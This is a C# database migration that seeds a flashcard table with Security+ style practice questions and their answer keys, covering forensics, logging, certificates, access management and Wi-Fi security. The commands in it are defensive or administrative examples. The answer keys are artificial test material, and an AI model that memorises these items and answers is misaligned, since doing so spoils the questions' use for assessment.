                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 666, "\r\n34. B. FTK Imager is a free tool that can image both systems and\r\nmemory, allowing Isaac to capture the information he wants.\r\nAlthough dd is useful for capturing disks, other tools are\r\ntypically used for memory dumps, and though dd can be used on\r\na Windows system, FTK Imager is a more likely choice. Autopsy\r\nis a forensic analysis tool and does not provide its own imaging\r\ntools. WinDump is a Windows version of tcpdump , a protocol\r\nanalyzer.\r\n", 4, "\r\n34. Isaac wants to acquire an image of a system that includes the operating system. What tool\r\ncan he use on a Windows system that can also capture live memory?\r\nA. dd\r\nB. FTK Imager\r\nC. Autopsy\r\nD. WinDump\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 667, "\r\n35. B. When artifacts are acquired as part of an investigation, they\r\nshould be logged and documented as part of the evidence related\r\nto the investigation. Artifacts could include a piece of paper with\r\npasswords on it, tools or technology related to an exploit or\r\nattack, smartcards, or any other element of an investigation.\r\n", 4, "\r\n35. Jason is conducting a forensic investigation and has retrieved artifacts in addition to drives\r\nand files. What should he do to document the artifacts he has acquired?\r\nA. Image them using dd and ensure that a valid MD5sum is generated.\r\nB. Take a picture of them, label them, and add them to the chain of custody documentation.\r\nC. Contact law enforcement to properly handle the artifacts.\r\nD. Engage legal counsel to advise him how to handle artifacts in an investigation.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 668, "\r\n36. A. The MX records for a domain list its email servers. Gary can\r\nuse nslookup to query Domain Name System (DNS) for the MX\r\nservers using the command nslookup -query =mx example.com to\r\nlook up example.com’s email server. ping does not support MX\r\nserver lookups, and both smtp and email are not command-line\r\ntools.\r\n", 4, "\r\n36. Gary wants to check for the mail servers for example.com. What tool and command can he\r\nuse to determine this?\r\nA. nslookup -query =mx example.com\r\nB. ping -email example.com\r\nC. smtp -mx example.com\r\nD. email -lookup -mx example.com\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 669, "\r\n37. B. Wireshark can be used to capture and analyze live Session\r\nInitiation Protocol (SIP) traffic on a network. Analysts should\r\nkeep the fact that SIP traffic may be encrypted on their network\r\nand that they may need to take additional steps to fully view the\r\ncontent of SIP packets. Log files can provide information about\r\nSIP sessions and events and are useful for analysis after the fact,\r\nbut they won’t provide the same detail about live SIP traffic.\r\nNessus is a vulnerability scanner, and SIPper was made up for\r\nthis question.\r\n", 4, "\r\n37. Which of the following is best suited to analyzing live SIP traffic?\r\nA. Log files\r\nB. Wireshark\r\nC. Nessus\r\nD. SIPper\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 670, "\r\n38. A. Although all of the tools listed can perform a port scan and\r\nidentify open ports, netcat is the only one that does not also\r\nintegrate automated service identification.\r\n", 4, "\r\n38. Andrea wants to identify services on a remote machine and wants the services to be labeled\r\nwith service names and other common details. Which of the following tools will not provide\r\nthat information?\r\nA. netcat\r\nB. Sn1per\r\nC. Nessus\r\nD. nmap\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 671, "\r\n39. D. Forensic reports should include appropriate technical detail.\r\nAnalysis of a system does not include a picture of the person\r\nfrom whom the system was acquired.\r\n", 4, "\r\n39. Joseph is writing a forensic report and wants to be sure he includes appropriate detail. Which\r\nof the following would not typically be included while discussing analysis of a system?\r\nA. Validation of the system clock’s time settings\r\nB. The operating system in use\r\nC. The methods used to create the image\r\nD. A picture of the person from whom the system was taken\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 672, "\r\n40. A. This question tests your knowledge of both the common\r\nLinux logs and basic format information for the auth.log file.\r\nGreg could use grep to search for \"Failed password\" in the\r\nauth.log file found in /var/log on many Linux systems. There is\r\nnot a common log file named bruteforce.log ; tail and head are\r\nnot useful for searching through the file, only for showing a set\r\nnumber of lines; and /etc/ is not the normal location for the\r\nauth.log file.\r\n", 4, "\r\n40. Greg believes an attacker has been using a brute-force password attack against a Linux\r\nsystem he is responsible for. What command could he use to determine if this is the case?\r\nA. grep \"Failed password\" /var/log/auth.log\r\nB. tail /etc/bruteforce.log\r\nC. head /etc/bruteforce.log\r\nD. grep \"Failed login\" /etc/log/auth.log\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 673, "\r\n41. C. The browser cache, history, and session information will all\r\ncontain information from recently visited sites. Bookmarks may\r\nindicate sites that a user has visited at some point, but a\r\nbookmark can be added without visiting a site at all.\r\n", 4, "\r\n41. Elaine wants to determine what websites a user has recently visited using the contents of a\r\nforensically acquired hard drive. Which of the following locations would not be useful for\r\nher investigation?\r\nA. The browser cache\r\nB. The browser history\r\nC. The browser’s bookmarks\r\nD. Session data\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 674, "\r\n42. C. Wireshark is a packet analyzer that can be used to capture\r\nand analyze network traffic for forensic purposes. Unlike disk\r\nforensics, network forensics require forethought and intentional\r\ncapture of data before it is needed since traffic is ephemeral.\r\nOrganizations that want to have a view of network traffic\r\nwithout capturing all traffic might use NetFlow or sFlow to\r\nprovide some information about network traffic patterns and\r\nusage. Nessus is a vulnerability scanner, nmap is a port scanner,\r\nand Simple Network Management Protocol (SNMP) is a\r\nprotocol used to transfer and gather information about network\r\ndevices and status.\r\n", 4, "\r\n42. Jason wants to acquire network forensic data. What tool should he use to gather this\r\ninformation?\r\nA. nmap\r\nB. Nessus\r\nC. Wireshark\r\nD. SNMP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 663, "\r\n31. B. Web page titles, as well as headers like meta tags, are\r\nexamples of metadata about a page and are frequently used to\r\ngather information about web pages and websites. Headers are\r\nused as part of a page’s design and typically describe the bar at\r\nthe top of the page used for site navigation. Summary and\r\nhidden data are not technical terms used to describe web page\r\ncomponents.\r\n", 4, "\r\n31. A web page’s title is considered what type of information about the page?\r\nA. Summary\r\nB. Metadata\r\nC. Header data\r\nD. Hidden data\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 621, "\r\n215. B. The system described is a privileged access management\r\n(PAM) system. PAM systems are used to manage and control\r\nprivileged accounts securely. MAC is an access control scheme\r\nthat enforces access at the OS level. FDE is full-disk encryption,\r\nand TLS is Transport Layer Security.\r\n", 3, "\r\n215. Greg has implemented a system that allows users to access accounts like administrator and\r\nroot without knowing the actual passwords for the accounts. When users attempt to use elevated\r\naccounts, their request is compared to policies that determine if the request should be\r\nallowed. The system generates a new password each time a trusted user requests access, and\r\nthen logs the access request. What type of system has Greg implemented?\r\nA. A MAC system\r\nB. A PAM system\r\nC. A FDE system\r\nD. A TLS system\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 649, "\r\n17. B. The -c flag for grep counts the number of occurrences for a\r\ngiven string in a file. The -n flag shows the matched lines and\r\nline numbers. Even if you’re not sure about which flag is which,\r\nthe syntax should help on a question like this. When using grep ,\r\nthe pattern comes before the filename, allowing you to rule out\r\ntwo of the options right away.\r\n", 4, "\r\n17. Nathan needs to know how many times an event occurred and wants to check a log file for\r\nthat event. Which of the following grep commands will tell him how many times the event\r\nhappened if each occurrence is logged independently in the logfile.txt log file, and uses\r\na unique event ID: event101?\r\nA. grep logfile.txt -n 'event101'\r\nB. grep -c 'event101' logfile.txt\r\nC. grep logfile.txt -c 'event101'\r\nD. grep -c event101 -i logfile.txt\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 647, "\r\n15. C. The chain of custody in forensic activities tracks who has a\r\ndevice, data, or other forensic artifact at any time, when\r\ntransfers occur, who performed analysis, and where the item,\r\nsystem, or device goes when the forensic process is done.\r\nEvidence logs may be maintained by law enforcement to track\r\nevidence that is gathered. Paper trail and digital footprint are\r\nnot technical terms used for digital forensics.\r\n", 4, "\r\n15. What term is used to describe the documentation trail for control, analysis, transfer, and final\r\ndisposition of evidence for digital forensic work?\r\nA. Evidence log\r\nB. Paper trail\r\nC. Chain of custody\r\nD. Digital footprint\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 623, "\r\n217. C. A universal endpoint management (UEM) tool can manage\r\ndesktops, laptops, mobile devices, printers, and other devices.\r\nUEM tools often use applications deployed to mobile devices to\r\nconfigure and manage them, and Olivia’s best option from this\r\nlist is a UEM tool. A CASB is a cloud access security broker and\r\nis not used to manage mobile devices, and the other options\r\nrequire massive amounts of manual work and are unlikely to\r\nsucceed—or users will simply change settings when it is\r\nconvenient to them.\r\n", 3, "\r\n217. Olivia wants to enforce a wide variety of settings for devices used in her organization.\r\nWhich of the following methods should she select if she needs to manage hundreds of\r\ndevices while setting rules for use of SMS and MMS, audio and video recording, GPS tagging,\r\nand wireless connection methods like tethering and hotspot modes?\r\nA. Use baseline settings automatically set for every phone before it is deployed using an\r\nimaging tool.\r\nB. Require users to configure their phones using a lockdown guide.\r\nC. Use a UEM tool and application to manage the devices.\r\nD. Use a CASB tool to manage the devices.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 624, "\r\n218. C. Next-generation (NG) secure web gateways (SWG) add\r\nadditional features beyond those found in cloud access security\r\nbrokers and next generation firewalls. While features can vary,\r\nthey may include web filtering, TLS decryption to allow traffic\r\nanalysis and advanced threat protection, cloud access security\r\nbroker (CASB) features, data loss prevention (DLP), and other\r\nadvanced capabilities. This type of solution is a relatively new\r\none, and the market is changing quickly.\r\n", 3, "\r\n218. John wants to deploy a solution that will provide content filtering for web applications,\r\nCASB functionality, DLP, and threat protection. What type of solution can he deploy to provide\r\nthese features?\r\nA. A reverse proxy\r\nB. A VPC gateway\r\nC. An NG SWG\r\nD. A next-gen firewall\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 625, "\r\n219. C. Access policies are built using information and attributes\r\nabout access requests. If the policy requirements are met, the\r\nactions like allowing or denying access, or requiring additional\r\nauthentication steps can be performed. Geolocation and timebased\r\nlogins focus on a single information component, and\r\naccount auditing is used to review permissions for accounts, not\r\nto perform this type of validation or policy-based control.\r\n", 3, "\r\n219. Brian wants to limit access to a federated service that uses Single Sign-On based on user\r\nattributes and group membership, as well as which federation member the user is logging in\r\nfrom. Which of the following options is best suited to his needs?\r\nA. Geolocation\r\nB. Account auditing\r\nC. Access policies\r\nD. Time-based logins\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 626, "\r\n220. B. Numeric representations of file permissions are commonly\r\nused instead of using rwx notation with chmod . A 7 sets full\r\npermissions, and the first number sets the user’s rights,\r\nmeaning that here the user will be granted full access to the file.\r\n", 3, "\r\n220. Sharif uses the chmod command in Linux to set the permissions to a file using the command\r\nchmod 700 example.txt. What permission has he set on the file?\r\nA. All users have write access to the file.\r\nB. The user has full access to the file.\r\nC. All users have execute access to the file.\r\nD. The user has execute access to the file.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 627, "\r\n221. B. Certificate pinning associates a known certificate with a host\r\nand then compares that known certificate with the certificate\r\nthat is presented. This can help prevent man-in-the-middle\r\nattacks but can fail if the certificate is updated and the pinned\r\ncertificate isn’t. A CRL, or certificate revocation list, would show\r\nwhether the certificate has been revoked, but it would not show\r\nif it was changed. Patrick will not have access to the remote\r\nserver’s private key unless he happens to be the administrator.\r\n", 3, "\r\n221. Patrick regularly connects to untrusted networks when he travels and is concerned that an\r\non-path attack could be executed against him as he browses websites. He would like to\r\nvalidate certificates against known certificates for those websites. What technique can he use\r\nto do this?\r\nA. Check the CRL.\r\nB. Use certificate pinning.\r\nC. Compare his private key to their public key.\r\nD. Compare their private key to their public key.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 628, "\r\n222. C. Privacy Enhanced Mail (PEM) is the most common format\r\nissued by certificate authorities. Distinguished Encoding Rules\r\n(DER) format is a binary form of the ASCII text PEM format.\r\nPKCS#7 or P7B format is Base64 ASCII, and PKCS#12, or PFX,\r\nformat is binary format used to store server certificates,\r\nintermediate certificates, and private keys in a single file.\r\n", 3, "\r\n222. What is the most common format for certificates issued by certificate authorities?\r\nA. DER\r\nB. PFX\r\nC. PEM\r\nD. P7B\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 629, "\r\n223. C. Michelle’s only option is to remove the certificate from the\r\nlist of trusted certificates on every machine that trusted it. This\r\ncan be time-consuming and error prone, and it’s one reason selfsigned\r\ncertificates are avoided in production at many\r\norganizations.\r\n", 3, "\r\n223. Michelle’s organization uses self-signed certificates throughout its internal infrastructure.\r\nAfter a compromise, Michelle needs to revoke one of the self-signed certificates. How can\r\nshe do that?\r\nA. Contact the certificate authority and request that they revoke the certificate.\r\nB. Add the certificate to the CRL.\r\nC. Remove the certificate from the list of whitelisted certificates from each machine that\r\ntrusts it.\r\nD. Reissue the certificate, causing the old version to be invalidated.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 630, "\r\n224. D. Changing the IP addresses associated with a domain to an\r\narbitrary value could cause routing or other problems. That\r\nmeans that changing the IP address would not be a chosen\r\nmethod of validating a domain. The remaining options are\r\nlegitimate and normal means of validation for certificates.\r\n", 3, "\r\n224. Which of the following is not a common way to validate control over a domain for a\r\ndomain-validated X.509 certificate?\r\nA. Changing the DNS TXT record\r\nB. Responding to an email sent to a contact in the domain’s WHOIS information\r\nC. Publishing a nonce provided by the certificate authority as part of the domain\r\ninformation\r\nD. Changing the IP addresses associated with the domain\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 631, "\r\n225. A. SNMPv3 adds the ability to authenticate users and groups\r\nand then encrypt messages, providing message integrity and\r\nconfidentiality. It does not have SQL injection prevention built\r\nin, but it also isn’t a protocol where SQL injection will typically\r\nbe a concern.\r\n", 3, "\r\n225. Fiona knows that SNMPv3 provides additional security features that previous versions of\r\nSNMP did not. Which of the following is not a security feature provided by SNMPv3?\r\nA. SQL injection prevention\r\nB. Message integrity\r\nC. Message authentication\r\nD. Message confidentiality\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 632, "\r\n226. A. This diagram shows a reverse proxy. A reverse proxy takes\r\nconnections from the outside world and sends them to an\r\ninternal server. A forward proxy takes internal connections and\r\nsends them to external servers. Round-robin and nextgeneration\r\nproxies are not types of proxies, although roundrobin\r\nis a form of load balancing.", 3, "\r\n226. The following figure shows a proxy in use. In this usage model, the proxy receives a connection\r\nrequest, and then connects to the server and forwards the original request. What type of\r\nproxy is this?\r\nExternal\r\nusers\r\nInternet\r\nProxy Server\r\nA. A reverse proxy\r\nB. A round-robin proxy\r\nC. A next-generation proxy\r\nD. A forward proxy", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 633, "1. A. Mila should select a hash because a hash is designed to be\r\nunique to each possible input. That means that multiple files\r\ncould have the same checksum value, whereas a hashing\r\nalgorithm will be unique for each file that it is run against.\r\n", 4, "1. Mila wants to generate a unique digital fingerprint for a file, and needs to choose between a\r\nchecksum and a hash. Which option should she choose and why should she choose it?\r\nA. A hash, because it is unique to the file\r\nB. A checksum, because it verifies the contents of the file\r\nC. A hash, because it can be reversed to validate the file\r\nD. A checksum, because it is less prone to collisions than a hash\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 648, "\r\n16. A. Of the listed tools, only nmap is a port scanner, and thus it is\r\nthe tool that will provide the required information. route is a\r\ncommand-line tool to view and add network traffic routes. hping\r\nis a packet generator and analyzer, and netstat is a commandline\r\ntool that shows network connections, interface statistics,\r\nand other useful information about a system’s network usage.\r\n", 4, "\r\n16. Henry wants to determine what services are on a network that he is assessing. Which of the\r\nfollowing tools will provide him with a list of services, ports, and their status?\r\nA. nmap\r\nB. route\r\nC. hping\r\nD. netstat\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 634, "\r\n2. A. Allow lists are lists of approved software. Software can only\r\nbe installed if it is on an allow list. Deny lists block specific\r\napplications, but they cannot account for every possible\r\nmalicious application. Access control lists (ACLs) determine\r\nwho can access a resource. A host intrusion detection system\r\n(HIDS) does not prevent software from being installed.\r\n", 4, "\r\n2. Which of the following would prevent a user from installing a program on a company-owned\r\nmobile device?\r\nA. An allow list\r\nB. A deny list\r\nC. ACL\r\nD. HIDS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 636, "\r\n4. D. Using tcpdump with flags like -i to set the interface, tcp to set\r\nthe protocol, and port to set the port will capture exactly the\r\ntraffic Emily needs to capture. Port 443 is the default HTTPS\r\nport. There is no -proto flag for tcpdump .\r\n", 4, "\r\n4. Emily wants to capture HTTPS packets using tcpdump. If the service is running on its default\r\nport and her Ethernet adapter is eth0, which tcpdump command should she use?\r\nA. tcpdump eth0 -proto https\r\nB. tcpdump -i eth0 -proto https\r\nC. tcpdump tcp https eth0\r\nD. tcpdump -i eth0 tcp port 443\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 637, "\r\n5. A. Tabletop exercises are used to talk through a process. Unlike\r\nwalk-throughs, which focus on step-by-step review of an\r\nincident, Mila will focus more on how her team responds and on\r\nlearning from those answers. A tabletop exercise can involve\r\ngaming out a situation. A simulation actually emulates an event\r\nor incident, either on a small or a large scale. Drills are not\r\ndefined as part of the Security+ exam outline.\r\n", 4, "\r\n5. Mila gives her team a scenario, and then asks them questions about how they would respond,\r\nwhat issues they expect they might encounter, and how they would handle those issues. What\r\ntype of exercise has she conducted?\r\nA. A tabletop exercise\r\nB. A walk-through\r\nC. A simulation\r\nD. A drill\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 638, "\r\n6. A. Backups are considered to be the least volatile type of\r\nstorage since they change at a much slower pace and, in fact,\r\nmay be intentionally retained for long periods of time without\r\nchanging. In this list, CPU cache will change the most\r\nfrequently, then RAM, then local disk contents.\r\n", 4, "\r\n6. Murali is preparing to acquire data from various devices and systems that are targets in a\r\nforensic investigation. Which of the following devices is the least volatile according to the\r\norder of volatility?\r\nA. Backups\r\nB. CPU cache\r\nC. Local disk\r\nD. RAM\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 639, "\r\n7. C. Incident responders know that scan results can show\r\nvulnerable systems and services, providing clues about how\r\nattackers may have obtained access to systems. The scans will\r\nnot show the programs the attackers used but may show services\r\nthat they have enabled or changed. The scans will show the\r\nversions of software installed before the attack, but that\r\ninformation is only useful if the attackers either upgraded or\r\nchanged the software or the software was vulnerable, making\r\nthis a less accurate and useful answer. Finally, the scans may\r\nshow where network security devices are, but that information\r\nshould be available to the incident response team without trying\r\nto figure it out from scans.\r\n", 4, "\r\n7. Henry has been asked for vulnerability scan results by an incident responder. He is curious\r\nto know why the responder needs scan results. What answer would you provide to him to\r\nexplain why scan results are needed and are useful?\r\nA. The scans will show the programs the attackers used.\r\nB. The scans will show the versions of software installed before the attack.\r\nC. Vulnerable services will provide clues about what the attackers may have targeted.\r\nD. The scans will show where firewalls and other network devices were in place to help\r\nwith incident analysis.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 640, "\r\n8. C. After eradication of the issue has been completed, recovery\r\ncan begin. Recovery can include restoration of services and a\r\nreturn to normal operations.\r\n", 4, "\r\n8. What phase of the incident response process should be placed at point A in the following\r\nimage?\r\nLessons\r\nLearned\r\nPreparation\r\nIdentification\r\nEradication Containment\r\nA Incident Response Process\r\nA. Simulations\r\nB. Review\r\nC. Recovery\r\nD. Patching\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 641, "\r\n9. C. The -p flag adds a persistent route when combined with the\r\nADD command. Persistent routes will remain in the routing table\r\nbetween boots. By default, they are cleared at each boot. An\r\nattacker may choose to use this to help with an on-path (man-inthe-\r\nmiddle) attack.\r\n", 4, "\r\n9. Nick is reviewing commands run on a Windows 10 system and discovers that the route\r\ncommand was run with the -p flag. What occurred?\r\nA. Routes were discovered using a ping command.\r\nB. The route’s path will be displayed.\r\nC. A route was added that will persist between boots.\r\nD. A route was added that will use the path listed in the command.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 642, "\r\n10. D. Of the options provided, only theHarvester is an open source\r\nintelligence tool. Curl is a tool used to transfer data, hping is a\r\ntool that is frequently used to build custom packets and to\r\nperform packet analyzer functions, and netcat is a utility that\r\nallows you to read and write to network connections, making it a\r\nbroadly used tool for pen testers and attackers who need to\r\ntransfer data using a small, capable utility.\r\n", 4, "\r\n10. Lucca wants to acquire open source intelligence information using an automated tool that\r\ncan leverage search engines and tools like Shodan. Which of the following tools should\r\nhe select?\r\nA. curl\r\nB. hping\r\nC. netcat\r\nD. theHarvester\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 643, "\r\n11. C. The MITRE ATT&CK framework focuses on techniques and\r\ntactics and does not focus on a specific order of operations like\r\nthe Cyber Kill Chain does. It also covers a broader range of\r\ntechniques and adversaries than the Diamond Model does and is\r\nbroadly implemented in many existing tools. The CVSS standard\r\nis a vulnerability scoring system and is not a useful framework\r\nfor analyzing malware and attacks.\r\n", 4, "\r\n11. Brent wants to use a tool to help him analyze malware and attacks and wants to cover a\r\nbroad range of tactics and tools that are used by adversaries. Which of the following is\r\nbroadly implemented in technical tools and covers techniques and tactics without requiring a\r\nspecific order of operations?\r\nA. The Diamond Model of Intrusion Analysis\r\nB. The Cyber Kill Chain\r\nC. The MITRE ATT&CK framework\r\nD. The CVSS standard\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 644, "\r\n12. D. To properly preserve the system, Ted needs to ensure that it\r\ndoes not change. Turning the system off will cause anything in\r\nmemory to be lost, which may be needed for the investigation.\r\nRemoving the drive while a system is running can cause data to\r\nbe lost. Instead, live imaging the machine and its memory may\r\nbe required. Allowing users to continue to use a machine will\r\nresult in changes, which can also damage Ted’s ability to\r\nperform a forensic investigation.\r\n", 4, "\r\n12. Ted needs to preserve a server for forensic purposes. Which of the following should\r\nhe not do?\r\nA. Turn the system off to ensure that data does not change.\r\nB. Remove the drive while the system is running to ensure that data does not change.\r\nC. Leave the machine connected to the network so that users can continue to use it.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 645, "\r\n13. D. Containment efforts are used to limit the spread or impact of\r\nan incident. Containment may focus on keeping systems or\r\nservices online to ensure that organizations can continue to\r\nfunction until other options for business continuity can be\r\nimplemented. Segmentation moves systems or services into\r\ndifferent security zones, and isolation removes them from all\r\ncontact or puts them in small groups that are removed from the\r\nrest of the organization and systems that are not impacted.\r\n", 4, "\r\n13. What mitigation technique is used to limit the ability of an attack to continue while keeping\r\nsystems and services online?\r\nA. Segmentation\r\nB. Isolation\r\nC. Nuking\r\nD. Containment\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 646, "\r\n14. D. Windows does not log network traffic at a level of\r\ngranularity that will show if a file has been uploaded. Basic\r\ntraffic statistics can be captured, but without additional sensors\r\nand information gathering capabilities, Jessica will not be able\r\nto determine if files are sent from a Windows system.\r\n", 4, "\r\n14. Jessica wants to review the network traffic that her Windows system has sent to determine if\r\na file containing sensitive data was uploaded from the system. What Windows log file can she\r\nuse to find this information?\r\nA. The application log\r\nB. The network log\r\nC. The security log\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 635, "\r\n3. C. Correlation dashboards are used to aggregate events and to\r\nseek out connections. In some cases, this is done with advanced\r\nanalytic algorithms, including artificial intelligence (AI) and\r\nmachine learning (ML). A network intrusion detection system\r\n(NIDS) would be helpful but will not (by itself) necessarily\r\ncorrelate events. A public key infrastructure (PKI) handles\r\ncertificates, not correlation and visibility of security events.\r\nTrend dashboards would show how things are going and which\r\nway statistics and information are moving.\r\n", 4, "\r\n3. Liam is responsible for monitoring security events in his company. He wants to see how\r\ndiverse events may connect using his security information and event management (SIEM).\r\nHe is interested in identifying different indicators of compromise that may point to the same\r\nbreach. Which of the following would be most helpful for him to implement?\r\nA. NIDS\r\nB. PKI\r\nC. A correlation dashboard\r\nD. A trend dashboard\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 565, "\r\n159. D. WPA3’s Personal mode replaces the preshared key mode\r\nfound in WPA2 with simultaneous authentication of equals. This\r\nmakes weak passphrase or password attacks harder to conduct\r\nand allows for greater security when devices are conducting\r\ntheir initial key exchange. WEP, WPA, and WPA2 do not\r\nimplement SAE.\r\n", 3, "\r\n159. Which Wi-Fi protocol implements simultaneous authentication of equals (SAE) to improve\r\non previous security models?\r\nA. WEP\r\nB. WPA\r\nC. WPA2\r\nD. WPA3\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 564, "\r\n158. C. Password complexity requires that passwords have a\r\nmixture of uppercase letters, lowercase letters, numbers, and\r\nspecial characters. This would be the best approach to correct\r\nthe problem described in the question. Longer passwords are a\r\ngood security measure but will not correct the issue presented\r\nhere. Changing passwords won’t make those passwords any\r\nstronger, and Single Sign-On (SSO) will have no effect on the\r\nstrength of passwords.\r\n", 3, "\r\n158. Chloe has noticed that users on her company’s network frequently have simple passwords\r\nmade up of common words. Thus, they have weak passwords. How could Chloe best mitigate\r\nthis issue?\r\nA. Increase minimum password length.\r\nB. Have users change passwords more frequently.\r\nC. Require password complexity.\r\nD. Implement Single Sign-On (SSO).\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 563, "\r\n157. B. Susan’s best option is to deploy full-disk encryption (FDE),\r\nwhich will ensure that the entire drive is encrypted, rather than\r\njust specific folders or files. Degaussing magnetic drives will\r\nwipe them, rather than protecting data.\r\n", 3, "\r\n157. Susan has been tasked with hardening the systems in her environment and wants to ensure\r\nthat data cannot be recovered from systems if they are stolen or their disk drives are stolen\r\nand accessed. What is her best option to ensure data security in these situations?\r\nA. Deploy folder-level encryption.\r\nB. Deploy full-disk encryption.\r\nC. Deploy file-level encryption.\r\nD. Degauss all the drives.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 482, "\r\n76. B. Although wireless analyzers provide in-depth information\r\nabout Service Set Identifiers (SSIDs), signal strength, and\r\nprotocol versions, the Remote Authentication Dial-In User\r\nService (RADIUS) or Kerberos version number for the backend\r\nauthentication servers is not something that they will typically\r\nbe able to provide.\r\n", 3, "\r\n76. Gary uses a wireless analyzer to perform a site survey of his organization. Which of the following\r\nis not a common feature of a wireless analyzer’s ability to provide information about\r\nthe wireless networks around it?\r\nA. The ability to show signal strength of access points on a map of the facility\r\nB. The ability to show the version of the RADIUS server used for authentication\r\nC. The ability to show a list of SSIDs available in a given location\r\nD. The ability to show the version of the 802.11 protocol (n, ac, ax)\r\n", "" });

